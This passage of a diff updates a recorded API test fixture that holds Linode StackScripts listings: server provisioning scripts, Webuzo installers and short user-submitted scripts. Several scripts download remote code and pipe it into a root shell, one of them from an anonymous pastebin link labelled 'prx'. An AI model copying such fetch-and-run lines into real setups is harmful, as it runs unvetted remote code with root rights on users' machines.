-      precise main restricted universe multiverse\ndeb http://us.archive.ubuntu.com/ubuntu/
-      precise-updates main restricted universe multiverse\ndeb http://security.ubuntu.com/ubuntu
-      precise-security main restricted universe multiverse\ndeb-src http://us.archive.ubuntu.com/ubuntu/
-      precise main restricted universe multiverse\ndeb-src http://us.archive.ubuntu.com/ubuntu/
-      precise-updates main restricted universe multiverse\ndeb-src http://security.ubuntu.com/ubuntu
-      precise-security main restricted universe multiverse\nEOF\napt-get update\napt-get
-      -y upgrade\n\nshow_msg \"installing common packages\"\napt-get -y install build-essential
-      htop byobu vim-nox tree git curl wget\n\nshow_msg \"modifying time zone\"\necho
-      $TIME_ZONE > /etc/timezone\ndpkg-reconfigure -f noninteractive tzdata\n\nshow_msg
-      \"adding admin user\"\nuseradd -U -d /home/$USER_NAME -m -s /bin/bash $USER_NAME\necho
-      \"$USER_NAME:$USER_PASSWORD\" | chpasswd\ncat <<EOF >/tmp/$USER_NAME\n$USER_NAME
-      ALL=(ALL) NOPASSWD:ALL\nEOF\nmv /tmp/$USER_NAME /etc/sudoers.d/$USER_NAME\nchmod
-      0440 /etc/sudoers.d/$USER_NAME\n\nshow_msg \"installing multi-user rvm version:
-      $RVM_VERSION\"\nsu -l $USER_NAME <<EOF\nif [[ $RVM_VERSION == \"stable\" ]]\nthen\n  curl
-      -sSL https://get.rvm.io | sudo bash -s -- stable --without-gems=\"rvm rubygems-bundler\"\nelse\n  curl
-      -sSL https://get.rvm.io | sudo bash -s -- --version $RVM_VERSION --without-gems=\"rvm
-      rubygems-bundler\"\nfi\nEOF\n\nshow_msg \"installing ruby version: $RVM_RUBY_VERSION\"\nsource
-      /etc/profile.d/rvm.sh\nrvm requirements\nrvm install $RVM_RUBY_VERSION\nusermod
-      -a -G rvm $USER_NAME\n\nshow_msg \"authorizing admin user pub key\"\nUSER_SSH_DIR=/home/$USER_NAME/.ssh\nmkdir
-      -m 0700 $USER_SSH_DIR\necho $USER_PUB_KEY > $USER_SSH_DIR/authorized_keys\nchmod
-      0600 $USER_SSH_DIR/authorized_keys\nchown -R $USER_NAME:$USER_NAME $USER_SSH_DIR\n
-      \nshow_msg \"turning on colored shell prompt\"\nsed -i ''/^#force_color_prompt=yes$/a\\\nforce_color_prompt=yes''
-      /home/$USER_NAME/.bashrc\nchown $USER_NAME:$USER_NAME /home/$USER_NAME/.bashrc\n\nshow_msg
-      \"adding add_app_runner.sh\"\ncat <<''EOF'' > /home/$USER_NAME/add_app_runner.sh
-      \n#!/bin/bash\n\nif [[ `id -u` -eq 0 && \"$#\" -eq 1 ]]; then\n  APP_RUNNER=\"$1\"\nelse\n  echo
-      \"Usage: $ sudo $0 app_runner_name\" >&2\n  exit 1\nfi\nuseradd -U -d /home/$APP_RUNNER
-      -m -s /bin/bash $APP_RUNNER\nEOF\nchmod 0700 /home/$USER_NAME/add_app_runner.sh\nchown
-      $USER_NAME:$USER_NAME /home/$USER_NAME/add_app_runner.sh\n\nshow_msg \"modifying
-      sshd setting\"\nsed -i \"s/^Port 22$/Port $USER_SSH_PORT/\" /etc/ssh/sshd_config\nsed
-      -i ''s/^LoginGraceTime 120$/LoginGraceTime 30/'' /etc/ssh/sshd_config\nsed -i
-      ''s/^PermitRootLogin yes$/PermitRootLogin no/'' /etc/ssh/sshd_config\n\nshow_msg
-      \"rebooting now\"\nreboot", "user_defined_fields": []}, {"id": 9010, "username":
-      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Coppermine
-      powered by Webuzo", "description": "Coppermine is a multi-purpose fully-featured
-      and integrated web picture gallery script written in PHP using GD or ImageMagick
-      as image library with a MySQL backend. \r\nCPG is so fully featured it''s not
-      enough to fully list them.\r\n\t\t\t\r\nWebuzo is a Single User Control Panel
-      which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System
-      Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in
-      the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
-      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
-      of the installation process, access http://your-ip:2004 to configure Coppermine
-      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
-      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
-      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
-      "Coppermine powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
-      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
-      Install Coppermine and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
-      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
-      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
-      etc) on their virtual machines or in the cloud.\n#\n# About Coppermine :\n#   Coppermine
-      is a multi-purpose fully-featured and integrated web picture gallery script
-      written in PHP \n#   using GD or ImageMagick as image library with a MySQL backend.
-      \n#   CPG is so fully featured it''s not enough to fully list them.\n###########################################################################################################\n\n#
-      Install Coppermine Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
-      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
-      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
-      \"http://$ip:2004/install.php?prepareinstall=27&license=$1\"\n   \n}\n\n# Install
-      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
-      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
-      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
-      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
-      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
-      Coppermine and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
-      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
-      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
-      \" Installation Completed \"\necho \"-------------------------------------\"\necho
-      \"Congratulations, Coppermine has been successfully installed\"\necho \" \"\necho
-      \"You can now configure Coppermine and Softaculous Webuzo at the following URL
-      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 346419, "username":
-      "lovefirst02", "user_gravatar_id": "44b8b01b76b4d763581dc4e1a8bbb427", "label":
-      "prx", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/debian8"],
-      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
-      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
-      "Initial import", "script": "#!/bin/sh\n\nwget -O spi https://pastebin.com/raw/1gRjw6Rn
-      && sed -i ''s/\\r$//'' spi && bash spi -jessie && rm spi", "user_defined_fields":
-      []}, {"id": 8501, "username": "gretongersvps66", "user_gravatar_id": "cfd4936b358ed931f5a628170dcfef25",
-      "label": "ariepmuqodas", "description": "", "ordinal": 0, "logo_url": "", "images":
-      ["linode/debian7"], "deployments_total": 0, "deployments_active": 0, "is_public":
-      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
-      "rev_note": "Initial import", "script": "#!/bin/bash\ncurl -s https://lv.linode.com/gzkA
-      | sudo bash", "user_defined_fields": []}, {"id": 9271, "username": "webuzo",
-      "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Nginx powered
-      by Webuzo", "description": "Nginx does mot rely on threads to handle requests.
-      Instead it uses a much more scalable event-driven (asynchronous) architecture.
-      This architecture uses small, but more importantly, predictable amounts of memory
-      under load.\r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users
-      deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX,
-      PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nPath
-      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
-      of the installation process, access http://your-ip:2004 to configure Softaculous
-      Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
-      "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
-      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
-      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
-      "Nginx powered by Webuzo", "script": "#!/bin/bash\n\n###########################################################################################################\n#
-      Install Nginx and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
-      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
-      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
-      etc) on their virtual machines or in the cloud.\n#\n# About Nginx :\n#   Nginx
-      does mot rely on threads to handle requests. Instead it uses a much more scalable
-      \n#   event-driven (asynchronous) architecture. This architecture uses small,
-      but more importantly, \n#   predictable amounts of memory under load.\n###########################################################################################################\n\n#
-      Install Nginx application using Webuzo\nfunction install_webuzo(){\n       \n    #
-      Fetch the Webuzo Installer\n    wget -N http://files.webuzo.com/install.sh >>
-      /root/webuzo-install.log 2>&1\n   \n    # Modify Permissions\n    chmod 0755
-      install.sh >> /root/webuzo-install.log 2>&1\n   \n    # Execute\n    ./install.sh
-      --install=nginx >> /root/webuzo-install.log 2>&1\n   \n    # Clean Up\n    rm
-      -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
-      Nginx using Softaculous Webuzo\n#########################################################\n\ninstall_webuzo\n\n#
-      Check the return of the above command and display the result accordingly\n\necho
-      \" \"\necho \"-------------------------------------\"\necho \" Installation
-      Completed \"\necho \"-------------------------------------\"\necho \"Congratulations,
-      Nginx has been successfully installed\"\necho \" \"\necho \"You can now configure
-      Nginx and Softaculous Webuzo at the following URL :\"\necho \"http://$ip:2004/\"\necho
-      \" \"\necho \"Thank you for choosing Softaculous Webuzo !\"\necho \" \"", "user_defined_fields":
-      []}], "page": 1, "pages": 19, "results": 1880}'
+      "user_defined_fields": []}], "page": 1, "pages": 22, "results": 2132}'
     headers:
       Access-Control-Allow-Credentials:
       - "true"
